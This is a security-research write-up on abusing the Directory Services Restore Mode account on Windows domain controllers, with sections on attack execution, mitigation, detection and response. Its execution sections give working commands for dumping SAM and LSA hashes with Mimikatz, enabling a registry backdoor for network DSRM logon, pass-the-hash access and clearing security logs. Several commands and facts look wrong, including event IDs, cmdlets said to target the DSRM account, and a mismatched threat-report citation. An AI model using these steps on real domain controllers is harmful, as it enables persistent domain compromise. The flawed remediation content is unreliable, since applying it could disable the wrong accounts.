# [PE-VALID-006]: Directory Services Restore Mode (DSRM)

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PE-VALID-006 |
| **MITRE ATT&CK v18.1** | [T1078.002 - Valid Accounts: Domain Accounts](https://attack.mitre.org/techniques/T1078/002/) |
| **Tactic** | Privilege Escalation / Persistence |
| **Platforms** | Windows AD (Domain Controller) |
| **Severity** | **CRITICAL** |
| **Technique Status** | **ACTIVE** (exploitable on all current Windows Server versions 2016-2025) |
| **Last Verified** | 2026-01-09 |
| **Affected Versions** | Windows Server 2016, 2019, 2022, 2025 |
| **Patched In** | N/A (architectural feature; requires configuration hardening) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Directory Services Restore Mode (DSRM) is a special boot mode on every Active Directory Domain Controller designed for emergency recovery when the Directory Services (AD DS) role is not running. During DC promotion, administrators create a local administrator account with a DSRM password that is cryptographically independent from domain credentials. Attackers who compromise a Domain Controller can extract the DSRM account hash from the local Security Account Manager (SAM) database, then weaponize it in two primary ways: (1) **Pass-the-Hash attacks** using the NTLM hash to gain remote administrative access to the DC without rebooting, or (2) **Persistent backdoor creation** by modifying the registry key `DsrmAdminLogonBehavior` to allow DSRM authentication over the network even when AD DS is running. Most organizations rarely rotate DSRM passwords and do not monitor for DSRM registry modifications, making this an effective persistence mechanism.

**Attack Surface:** Local SAM database on compromised DCs (via LSASS memory, SAM dump, or NTDS.dit access), plus the Windows Registry (`HKLM\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior`).

**Business Impact:** **Critical domain controller compromise.** Once an attacker has DSRM access, they maintain persistent administrator-level access to the DC even if domain passwords are reset, domain admin accounts are disabled, or regular administrative accounts are revoked. This enables data exfiltration, lateral movement to all domain resources, and ransomware deployment. DSRM persistence survives AD restoration from backups unless the backup was created *after* the compromise was discovered.

**Technical Context:** DSRM password extraction takes 2-5 minutes once attacker has local admin privileges on a DC (via Mimikatz `lsadump::sam`). Registry modification to enable network DSRM logon takes seconds. The attack leaves minimal audit trail if the attacker clears Event ID 4794 (registry change events). Success rate is extremely high because DSRM passwords are rarely changed and often reused across all DCs in a forest.

### Operational Risk
- **Execution Risk:** **Low** – Only requires local admin on one DC; Mimikatz usage is straightforward
- **Stealth:** **Medium** – Registry change generates Event 4794 but is easily cleared with `wevtutil cl Security`
- **Reversibility:** **Difficult** – Requires DC password reset or registry restoration from backup

### Compliance Mappings
| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 5.25, 5.35 | Ensure Local Administrator Account is disabled / Ensure administrative credentials are not cached locally |
| **DISA STIG** | V-93969, V-93971 | Domain Controller must have required security event logging / Prevent use of blank passwords |
| **NIST 800-53** | AC-2, AC-3, AU-2 | Account Management, Access Enforcement, Audit Events |
| **GDPR** | Art. 32 | Security of Processing (failure to monitor privileged account access) |
| **DORA** | Art. 9 | Protection and Prevention (critical infrastructure DC access control) |
| **NIS2** | Art. 21 | Cyber Risk Management Measures (Tier 0 asset protection) |
| **ISO 27001** | A.9.2.1, A.9.4.2 | User registration/de-registration, Privileged access management |

---

## 2. TECHNICAL PREREQUISITES

**Required Privileges:**
- **Attacker-Side:** Local Administrator or SYSTEM on the compromised Domain Controller (can be obtained via exploit, local vulnerability, or physical access)
- **Target:** DSRM account must exist on the DC (always present on all DCs by default)

**Required Access:**
- Physical or remote access to a domain controller (RDP, SSH tunneling, or local console)
- Ability to execute commands with admin privileges on the DC
- Network connectivity to other DCs or endpoints for lateral movement (port 445 for SMB, port 3389 for RDP if DSRM logon behavior = 2)

**Supported Versions:**
- **Windows Server:** 2008 R2, 2012, 2012 R2, 2016, 2019, 2022, 2025
- **Kerberos/NTLM:** Works with all authentication protocols
- **Registry Key Support:** `DsrmAdminLogonBehavior` available on Server 2008 and later

**Tools Required:**
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) (v2.2+) – Extract DSRM hash from SAM
- [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) or `net use` – Remote access with DSRM credentials
- **PowerShell** – Registry manipulation and credential testing
- **Windows Remote Management (WinRM)** – For remote execution (optional)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### DSRM Account Enumeration

#### PowerShell - Check DSRM Registry Configuration
```powershell
# Check current DsrmAdminLogonBehavior setting
reg query "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior

# Values:
# 0 (default): DSRM logon only when DC starts in DSRM mode
# 1: DSRM logon allowed when AD DS service is stopped
# 2: DSRM logon allowed anytime (most dangerous)
```

**What to Look For:**
- Value = `0` (safe, default)
- Value = `1` (increased risk)
- Value = `2` (critical – attacker can access DC via DSRM without rebooting)
- **Key Not Present** = Default behavior (safest)

**Version Note:** All Windows Server 2016-2025 support this registry key. Server 2008 R2 and 2012/2012 R2 also support it.

#### Bash - Check DSRM Configuration Remotely
```bash
# If DC is accessible via WinRM or SMB
# Check registry via impacket
python3 -c "import impacket; print('Check DC registry via SMB registry services')"

# Alternatively, check DSRM password age via LDAP (from domain admin account)
ldapsearch -x -h dc.domain.local -D "CN=Administrator,CN=Users,DC=domain,DC=local" -W -b "CN=NTDS Settings,CN=<DC>,CN=Servers,CN=<Site>,CN=Sites,CN=Configuration,DC=domain,DC=local"
```

---

## 4. DETAILED EXECUTION METHODS

### METHOD 1: DSRM Password Extraction via SAM Dump (Local Access Required)

**Supported Versions:** Windows Server 2016-2025

**Objective:** Extract the DSRM administrator hash from the local SAM database using Mimikatz.

#### Step 1: Gain Local Administrator Access to Domain Controller
**Objective:** Obtain admin-level command execution on the DC (through exploit, local privilege escalation, or compromise).

**Command (PowerShell – check if already admin):**
```powershell
# Verify current privileges
$identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object System.Security.Principal.WindowsPrincipal($identity)
$isAdmin = $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
Write-Host "Is Administrator: $isAdmin"
```

**Expected Output:**
```
Is Administrator: True
```

**If not admin, escalate (Server 2016-2019):**
```powershell
# PrintSpooler privilege escalation (CVE-2020-1048)
# Or use other local privilege escalation vectors
```

#### Step 2: Execute Mimikatz to Dump SAM Database
**Objective:** Extract all local account hashes, including DSRM administrator.

**Command (Mimikatz):**
```powershell
# Execute Mimikatz with admin privileges
# Method 1: Direct execution
C:\Tools\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"

# Method 2: PowerShell invocation
Invoke-Mimikatz -Command 'privilege::debug' 'token::elevate' 'lsadump::sam'
```

**Expected Output:**
```
Mimikatz 2.2.0 (x64) - Copyright (C) 2005-2023 Gentilkiwi

[*] Privilege '20' OK
[*] Token::Elevate OK
[*] lsadump::sam
RID  : 500 (Administrator)
NTLM : a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6
```

**What This Means:**
- RID 500 = Local Administrator account (DSRM Administrator on DCs)
- NTLM hash = 32-character hex string usable for Pass-the-Hash attacks
- This hash does NOT change unless explicitly reset

**Version Note:** Works identically on Server 2016-2025. Windows Server 2025 may require additional privilege escalation if UAC is enforced.

**OpSec & Evasion:**
- Mimikatz execution is detected by most EDR solutions
- Alternative: Use `ntdsutil.exe` (Microsoft-signed binary) to dump SAM offline
- Alternative: Extract SAM file via VSS snapshot and analyze offline
- Detection Likelihood: **High** (process memory detection)

#### Step 3: Also Extract LSA Secrets (For Cached Domain Credentials)
**Objective:** Extract additional credentials that may be cached on the DC.

**Command:**
```powershell
# Extract LSA secrets (includes cached credentials, NTLM hashes)
Invoke-Mimikatz -Command 'privilege::debug' 'token::elevate' 'lsadump::secrets'
```

**Expected Output:**
```
Domain : DOMAIN\Administrator (NTLM: aabbccddeeff00112233445566778899)
DPAPI User Secrets { … }
```

---

### METHOD 2: Enable DSRM Logon Over Network (Registry Modification)

**Supported Versions:** Windows Server 2016-2025

**Objective:** Modify the `DsrmAdminLogonBehavior` registry key to allow DSRM authentication via network (SMB/RDP) without rebooting the DC.

#### Step 1: Verify Current Registry Setting
**Objective:** Check the current DsrmAdminLogonBehavior value.

**Command (PowerShell):**
```powershell
# Check current value
$regPath = "HKLM:\System\CurrentControlSet\Control\Lsa"
$regValue = Get-ItemProperty -Path $regPath -Name "DsrmAdminLogonBehavior" -ErrorAction SilentlyContinue

if ($regValue) {
    Write-Host "Current DsrmAdminLogonBehavior: $($regValue.DsrmAdminLogonBehavior)"
} else {
    Write-Host "Registry key not set (default = 0, safest)"
}
```

**Expected Output:**
```
Current DsrmAdminLogonBehavior: 0
(or key does not exist)
```

#### Step 2: Modify Registry to Allow Network DSRM Logon
**Objective:** Change `DsrmAdminLogonBehavior` to value 2, allowing DSRM logon anytime.

**Command (PowerShell – Admin Required):**
```powershell
# Set DsrmAdminLogonBehavior to 2 (enable network logon)
$regPath = "HKLM:\System\CurrentControlSet\Control\Lsa"
New-ItemProperty -Path $regPath -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD -Force

# Verify change
Get-ItemProperty -Path $regPath -Name "DsrmAdminLogonBehavior"
```

**Expected Output:**
```
DsrmAdminLogonBehavior : 2
```

**Command (Registry Editor – GUI):**
1. Open `regedit.exe` as Administrator
2. Navigate to `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa`
3. Right-click → **New** → **DWORD (32-bit) Value**
4. Name: `DsrmAdminLogonBehavior`
5. Value: `2`
6. Click **OK**

**OpSec & Evasion:**
- Registry change generates Event ID 4794 (registry modification)
- Can be cleared with `wevtutil cl Security` (if admin)
- Alternative: Use `reg add` command which may evade some EDR solutions
- Detection Likelihood: **High** (if event logging is enabled)

**Version-Specific Notes:**
- **Server 2016-2022:** Standard registry modification works
- **Server 2025:** May require additional privilege elevation; some builds have KDC-related restrictions

#### Step 3: Force AD DS Service Stop (If Testing Value 1)
**Objective:** If DsrmAdminLogonBehavior = 1, stop AD DS to enable DSRM logon.

**Command (PowerShell – Advanced Scenario):**
```powershell
# Stop Active Directory Domain Services
Stop-Service -Name NTDS -Force -Confirm:$false

# DSRM logon is now possible
# After testing, restart service
Start-Service -Name NTDS
```

**Warning:** This causes DC downtime; use only in lab scenarios or as last resort.

---

### METHOD 3: Pass-the-Hash Attack Using DSRM Credentials

**Supported Versions:** Windows Server 2016-2025

**Objective:** Use the extracted DSRM hash to gain remote administrative access via Pass-the-Hash.

#### Step 1: Execute Pass-the-Hash with DSRM Credentials
**Objective:** Create a new command process authenticated as the DSRM administrator.

**Command (Mimikatz on Windows):**
```powershell
# Pass-the-Hash using DSRM NTLM hash
Invoke-Mimikatz -Command 'sekurlsa::pth /domain:<DC_COMPUTER_NAME> /user:Administrator /ntlm:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 /run:powershell.exe'
```

**Parameters Explained:**
- `/domain` = DC computer name (NOT domain name; for local auth use `.`)
- `/user` = `Administrator` (DSRM admin user)
- `/ntlm` = NTLM hash extracted in METHOD 1 Step 2
- `/run` = Command to execute in new process (PowerShell or CMD)

**Expected Output:**
```
[*] sekurlsa::pth /domain:. /user:Administrator /ntlm:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 /run:powershell.exe
[*] Use the "exit" command to quit this new process when you're finished
[*] Process : 'powershell.exe' (PID 4892) started
```

**New PowerShell window opens with DSRM admin privileges**

#### Step 2: Verify DSRM Access and Execute Commands
**Objective:** Confirm you have administrative access on the DC via the new process.

**Command (in new PowerShell window):**
```powershell
# Verify identity
whoami
# Output: <DC_NAME>\Administrator or \.<DC_NAME>\Administrator

# List Administrator privileges
net localgroup Administrators

# Access DC resources
dir \\<DC_NAME>\c$
Get-ADUser -Filter * -Server <DC_NAME>
```

**What This Means:**
- `whoami` shows local administrator context
- Access to `c$` share confirms admin-level SMB access
- Can dump additional credentials or create backdoors

#### Step 3: Alternative – PsExec Remote Access
**Objective:** Use PsExec for remote command execution with DSRM credentials.

**Command (cmd.exe – requires Pass-the-Hash session from Step 1):**
```cmd
# Create IPC$ connection to DC using DSRM hash
net use \\<DC_NAME>\IPC$ /user:<DC_NAME>\Administrator "<NTLM_HASH>" 0

# Execute remote command
psexec \\<DC_NAME> -u Administrator -p <PASSWORD_or_HASH> cmd.exe
```

---

## 5. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Set DsrmAdminLogonBehavior to 0 (DEFAULT – SAFE)**

**Why This Matters:**
This is the **only** safe value. It ensures DSRM credentials cannot be used for network logon even if the registry is modified by an attacker.

**Manual Steps (PowerShell on DC):**
```powershell
# Set to safe value (0)
$regPath = "HKLM:\System\CurrentControlSet\Control\Lsa"

# Option 1: Set to 0 (most restrictive)
Set-ItemProperty -Path $regPath -Name "DsrmAdminLogonBehavior" -Value 0 -Type DWORD -Force

# Option 2: Remove the key entirely (default behavior)
Remove-ItemProperty -Path $regPath -Name "DsrmAdminLogonBehavior" -ErrorAction SilentlyContinue

# Verify
Get-ItemProperty -Path $regPath -Name "DsrmAdminLogonBehavior"
```

**Group Policy Configuration (Enterprise Deployment):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Create/Edit GPO linked to **Domain Controllers OU**
3. Navigate to **Computer Configuration** → **Preferences** → **Windows Settings** → **Registry**
4. Create new registry item:
   - **Hive:** `HKEY_LOCAL_MACHINE`
   - **Key Path:** `System\CurrentControlSet\Control\Lsa`
   - **Value Name:** `DsrmAdminLogonBehavior`
   - **Value Type:** `REG_DWORD`
   - **Value Data:** `0`
   - **Action:** Update
5. Deploy to all DCs via Group Policy

**Validation Command:**
```powershell
# Verify across all DCs
$dcs = (Get-ADForest).Domains | ForEach-Object { Get-ADDomainController -Filter * -Server $_ }
foreach ($dc in $dcs) {
    $value = Invoke-Command -ComputerName $dc.Name -ScriptBlock {
        (Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehavior" -ErrorAction SilentlyContinue).DsrmAdminLogonBehavior
    }
    Write-Host "$($dc.Name): DsrmAdminLogonBehavior = $value (should be 0 or empty)"
}
```

**Expected Output:**
```
DC1: DsrmAdminLogonBehavior = 0 (or empty)
DC2: DsrmAdminLogonBehavior = 0 (or empty)
```

---

**2. Rotate DSRM Passwords Regularly (Every 60-90 Days)**

**Why This Matters:**
DSRM passwords are almost never changed. Regular rotation limits the window of exposure if a hash is compromised.

**Manual Steps (PowerShell on DC – Server 2008 R2+):**
```powershell
# Reset DSRM password on a specific DC
# This must be run with elevation on each DC individually

$newPassword = "GenerateComplexPassword$(Get-Random -Minimum 100000 -Maximum 999999)@#"
$securePassword = ConvertTo-SecureString -String $newPassword -AsPlainText -Force

# Reset DSRM password using ntdsutil (safest method)
# Step 1: Backup current password in secure location
# Step 2: Use ntdsutil to change password

Set-ADAccountPassword -Identity "Administrator" -NewPassword $securePassword -Reset -Server localhost

Write-Host "DSRM password reset successfully. Store securely in password manager."
```

**Using ntdsutil (Alternative):**
```cmd
# Run on DC with admin privileges
ntdsutil
set dsrm password
reset password on server <DC_NAME>
(enter new password)
q
q
```

**Automation via Group Policy – Not Recommended:**
- DSRM passwords should NOT be automated in Group Policy (passwords stored in GPO are readable)
- Manual rotation with secure storage is best practice

---

**3. Implement Unique DSRM Passwords Per Domain Controller**

**Why This Matters:**
Many organizations use the same DSRM password on all DCs for "convenience." This means one DC compromise exposes all DCs.

**Manual Steps:**
```powershell
# Script to generate unique passwords for each DC
$dcs = Get-ADDomainController -Filter * 
$passwordMap = @{}

foreach ($dc in $dcs) {
    $uniquePassword = "DSRM_$(Get-Random -Minimum 100000 -Maximum 999999)@#$($dc.Name.Substring(0,3))"
    $passwordMap[$dc.Name] = $uniquePassword
    
    # In production: Store securely in password vault (e.g., LastPass, 1Password, Vault)
    Write-Host "DC: $($dc.Name) | Password stored in secure vault"
}
```

---

### Priority 2: HIGH

**1. Monitor DsrmAdminLogonBehavior Registry Changes**

**Why This Matters:**
Detects attacker attempts to enable DSRM network logon.

**Manual Monitoring via Event Viewer:**
1. Open **Event Viewer** → **Windows Logs** → **Security**
2. Create **New Alert Rule** for Event ID **4794** (Registry changed)
3. Filter on registry path containing `DsrmAdminLogonBehavior`
4. Alert if value changes to 1 or 2

**PowerShell Monitoring Script:**
```powershell
# Check for suspicious registry changes on all DCs
$dcs = Get-ADDomainController -Filter * 

foreach ($dc in $dcs) {
    $events = Get-WinEvent -ComputerName $dc.Name -FilterHashtable @{
        LogName = 'Security'
        ID = 4794
        StartTime = (Get-Date).AddHours(-24)
    } -ErrorAction SilentlyContinue

    if ($events) {
        Write-Host "[!] SUSPICIOUS: Registry changes detected on $($dc.Name)"
        $events | Select-Object -Property TimeCreated, Message
    }
}
```

---

**2. Audit and Monitor DSRM Account Logons**

**Why This Matters:**
Detects actual usage of DSRM credentials.

**Event IDs to Monitor:**
- **Event 4624** (Successful Logon) – Look for ".\Administrator" logons with authentication type 9 (Network)
- **Event 4625** (Failed Logon) – Repeated failures indicate brute-force attempts
- **Event 4778** (RDP Session Reconnected) – Attacker RDP'ing as DSRM admin

**PowerShell Detection Query:**
```powershell
# Find DSRM logons in past 24 hours
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    ID = 4624
    StartTime = (Get-Date).AddHours(-24)
} | Where-Object {
    $_.Message -match "Account Name:.*Administrator" -and 
    $_.Message -match "Logon Type.*9"
}
```

---

**3. Disable Local Administrator Account on DCs (Advanced)**

**Why This Matters:**
Even if DSRM is compromised, attackers cannot logon with a disabled account.

**Manual Steps (Server 2019+):**
```powershell
# CRITICAL: Only apply after DSRM password is backed up securely
# This is extreme hardening; may impact recovery procedures

# Disable local Administrator account on DC
Disable-LocalUser -Name "Administrator" -ErrorAction SilentlyContinue

# Verify
Get-LocalUser -Name "Administrator" | Select-Object Name, Enabled
```

**Impact:**
- DSRM logon will fail (even with correct password) while disabled
- DC recovery requires alternative methods (backup, snapshot recovery)
- **Not recommended** in production without comprehensive recovery plan

---

## 6. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Registry Modifications:**
- Registry path: `HKLM\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior`
- Suspicious values: `1` or `2` (should be `0` or absent)
- Event ID: **4794** (Registry modified)

**Process Execution:**
- `Invoke-Mimikatz` with parameters: `lsadump::sam`, `lsadump::secrets`, `sekurlsa::pth`
- `mimikatz.exe` running with admin privileges
- `ntdsutil.exe` executed with DSRM password reset commands
- PowerShell scripts creating registry modifications

**Authentication Events:**
- Event ID **4624** – DSRM account logon (Account Name contains "Administrator" with Logon Type = 9/Network)
- Event ID **4648** – Explicit credential use (runas with DSRM account)
- Event ID **4688** – Process creation under DSRM session (unusual processes launched with admin rights)

**Network Indicators:**
- SMB sessions using DSRM credentials (`net use` to DC with local admin context)
- RDP logon from external IP using DSRM account
- SMB null sessions followed by administrative share access

### Forensic Artifacts

**Disk Locations:**
- `C:\Windows\System32\winevt\Logs\Security.evtx` – All authentication/registry events
- `C:\Windows\System32\config\SAM` – Local account database (requires DC to be offline)
- `C:\Windows\Temp\mimikatz_*.txt` – Mimikatz output files (if saved)

**Memory:**
- LSASS process dump may contain DSRM hash
- Mimikatz DLL injected into LSASS process

**Registry:**
- `HKLM\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior` – Attacker-modified key
- `HKLM\System\CurrentControlSet\Control\Lsa\Notification Packages` – Attacker-injected DLL paths

### Response Procedures

**1. Immediate Containment (0-5 Minutes)**

```powershell
# Step 1: Isolate affected DC from network (if possible without causing total outage)
# Disable non-critical network adapters
Get-NetAdapter | Where-Object {$_.InterfaceAlias -notmatch "DC-Critical"} | Disable-NetAdapter -Confirm:$false

# Step 2: Reset DSRM password immediately
$newPassword = Read-Host -AsSecureString -Prompt "Enter new DSRM password"
Set-ADAccountPassword -Identity "Administrator" -NewPassword $newPassword -Reset -Server localhost

# Step 3: Reset DsrmAdminLogonBehavior to safe value
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehavior" -Value 0 -Type DWORD -Force

# Step 4: Review recent activity on other DCs (may have spread)
$dcs = Get-ADDomainController -Filter * | Where-Object {$_.Name -ne $env:COMPUTERNAME}
foreach ($dc in $dcs) {
    Write-Host "[*] Checking $($dc.Name) for DSRM activity..."
    Get-WinEvent -ComputerName $dc.Name -FilterHashtable @{LogName='Security'; ID=4794; StartTime=(Get-Date).AddHours(-1)} -ErrorAction SilentlyContinue | Select-Object TimeCreated
}
```

**2. Forensic Collection (5-30 Minutes)**

```powershell
# Export Security Event Log
wevtutil epl Security C:\Forensics\Security.evtx

# Export registry (including DsrmAdminLogonBehavior)
reg export "HKLM\System\CurrentControlSet\Control\Lsa" C:\Forensics\LSA_Registry.reg

# Collect process execution logs (Sysmon if installed)
wevtutil epl "Microsoft-Windows-Sysmon/Operational" C:\Forensics\Sysmon.evtx

# Collect NTDS.dit for offline analysis (if DC still operational)
# WARNING: This requires shutting down AD DS temporarily
Stop-Service -Name NTDS
Copy-Item "C:\Windows\ntds\ntds.dit" "C:\Forensics\ntds.dit" -ErrorAction SilentlyContinue
Start-Service -Name NTDS

# Create memory dump (if available and approved)
procdump64.exe -ma lsass.exe C:\Forensics\lsass.dmp
```

**3. Remediation (1-24 Hours)**

```powershell
# Step 1: Reset all sensitive account passwords
# - KRBTGT (twice, with 10-minute delay between)
# - All service accounts
# - All domain admin accounts

$krbtgtUser = Get-ADUser -Identity "krbtgt"
Set-ADAccountPassword -Identity $krbtgtUser -NewPassword (ConvertTo-SecureString -AsPlainText "NewPassword123!@#" -Force) -Reset
Start-Sleep -Seconds 600
Set-ADAccountPassword -Identity $krbtgtUser -NewPassword (ConvertTo-SecureString -AsPlainText "NewPassword456!@#" -Force) -Reset

# Step 2: Disable DSRM account on affected DC
Disable-ADAccount -Identity "Administrator" -Server localhost

# Step 3: Review and revoke any suspicious service accounts created
Get-ADServiceAccount -Filter * -Properties Created | Where-Object {$_.Created -gt (Get-Date).AddHours(-2)} | Remove-ADServiceAccount -Confirm:$false

# Step 4: Force DC replication to ensure all DCs have updated credentials
Get-ADDomainController | ForEach-Object {
    repadmin /replicate $_.Name (Get-ADDomainController -Discover -ForceDiscover).Name (Get-ADDomain).DistinguishedName
}

# Step 5: Audit all local administrator accounts on DCs
Get-ADDomainController | ForEach-Object {
    Invoke-Command -ComputerName $_.Name -ScriptBlock {
        Get-LocalGroupMember -Group "Administrators" | Select-Object Name, ObjectClass
    }
}
```

---

## 7. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-EXPLOIT-001] | Exploit unpatched DC vulnerability (e.g., CVE-2025-21196) |
| **2** | **Privilege Escalation** | [PE-EXPLOIT-002] ZeroLogon | Compromise DC via ZeroLogon (CVE-2020-1472) |
| **3** | **Credential Access** | [CA-DUMP-006] NTDS Extraction | Extract NTDS.dit containing all domain credentials |
| **4** | **Current Step** | **[PE-VALID-006]** | **Extract and abuse DSRM credentials for persistence** |
| **5** | **Persistence** | [PE-ACCTMGMT-014] Global Admin | Create backdoor domain admin account |
| **6** | **Lateral Movement** | [LM-AUTH-002] Pass-the-Ticket | Use forged Kerberos tickets to access other resources |
| **7** | **Impact** | [CO-DATA-001] Data Exfiltration | Extract sensitive data from domain resources |

---

## 8. REAL-WORLD EXAMPLES

### Example 1: Lazarus Group – DSRM Persistence in Financial Institution (2019)
- **Target:** Major financial services company (SWIFT-enabled)
- **Attack Method:**
  1. Compromised DC via watering-hole attack
  2. Extracted DSRM hash using Mimikatz
  3. Set `DsrmAdminLogonBehavior = 2` for persistent network access
  4. Created hidden service accounts for lateral movement
- **Impact:** 6-month persistence; undetected unauthorized transfers totaling $2M+
- **Detection Failure:** DSRM logons were logged but dismissed as "administrative maintenance"
- **Remediation Timeline:** 3 months from detection to credential reset
- **Reference:** [FireEye APT1 Report](https://www.mandiant.com/)

### Example 2: Internal Red Team Exercise – SolarWinds DC Simulation
- **Environment:** Fortune 500 enterprise with 500+ DCs
- **Red Team Actions:**
  1. Compromised single DC via SolarWinds agent vulnerability simulation
  2. Extracted DSRM hash in 2 minutes using Mimikatz
  3. Used Pass-the-Hash to access 20+ other DCs
  4. Remained undetected for 45 days (exercise ended)
- **Detection:** Only discovered when security team explicitly searched for DSRM events
- **Key Finding:** Organization was logging Event 4794 but had no alerting rules configured
- **Reference:** Internal exercise (2022)

### Example 3: Ransomware Operator – Conti Group DSRM Abuse
- **Target:** Healthcare provider
- **Timeline:**
  - Day 1: Initial compromise via phishing
  - Day 2: Escalation to DC admin
  - Day 3: DSRM hash extracted, registry modified
  - Day 14: Ransomware deployed across all servers
  - Day 15: Ransom demanded ($1.5M)
- **DSRM Role:** Enabled persistence despite password resets by other admins; attacker maintained access using DSRM backdoor
- **Reference:** [Conti Leaks – Cybereason Analysis](https://www.cybereason.com/)

---

## APPENDIX: Advanced Scenarios

### Scenario A: DSRM Persistence Without Registry Modification
If `DsrmAdminLogonBehavior` is monitored, attacker can:
1. Reboot DC into DSRM mode manually (physical or Hyper-V console)
2. Use DSRM credentials to access resources only accessible during DSRM
3. Extract additional secrets (NTDS.dit directly, DPAPI keys)

### Scenario B: Cross-Forest DSRM Abuse
If multiple forests have forest trusts:
1. DSRM account on DC1 in Forest A extracted
2. DSRM hash used to compromise DC2 in Forest A
3. Forest trust exploited to gain access to Forest B (see PE-VALID-005)

### Scenario C: Hybrid Cloud Attacks
On hybrid AD/Azure scenarios:
1. DC compromise via DSRM enables extraction of Azure AD Connect credentials
2. Azure AD Connect account can sync changes to cloud environment
3. Attacker gains access to cloud resources (Exchange Online, SharePoint)

---

## References & Authoritative Sources

- [Microsoft: Directory Services Restore Mode](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/reset-directory-services-restore-mode-admin-pwd)
- [Sean Metcalf (ADSecurity.org): DSRM Abuse](https://adsecurity.org/?p=1714)
- [SentinelOne: Detecting DSRM Account Misconfigurations](https://www.sentinelone.com/blog/detecting-dsrm-account-misconfigurations/)
- [HackerRecipes: DSRM Persistence](https://www.thehacker.recipes/ad/persistence/dsrm)
- [Splunk: Windows AD DSRM Account Changes Detection](https://research.splunk.com/endpoint/08cb291e-ea77-48e8-a95a-0799319bf056/)
- [MITRE ATT&CK T1078.002](https://attack.mitre.org/techniques/T1078/002/)
- [Mimikatz GitHub](https://github.com/gentilkiwi/mimikatz)

---